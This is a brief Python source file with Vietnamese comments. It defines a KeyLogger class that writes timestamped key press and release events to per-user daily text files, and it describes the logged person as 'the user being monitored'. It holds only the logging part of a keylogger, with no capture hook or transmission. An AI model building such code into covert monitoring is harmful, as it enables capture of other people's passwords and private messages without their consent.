# key_logger.py
import os
from datetime import datetime

class KeyLogger:
    def __init__(self, log_dir="logs"):
        self.log_dir = log_dir
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
        
    def log_key_event(self, event_type, key, username="unknown"):
        """Ghi log sự kiện phím
        Args:
            event_type: "press" hoặc "release" 
            key: phím được nhấn/thả
            username: tên user đang được theo dõi
        """
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_file = os.path.join(self.log_dir, f"keylog_{username}_{datetime.now().strftime('%Y%m%d')}.txt")
            
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"[{timestamp}] {event_type}: {key}\n")
                
        except Exception as e:
            print(f"[KEYLOGGER] Error logging key event: {e}")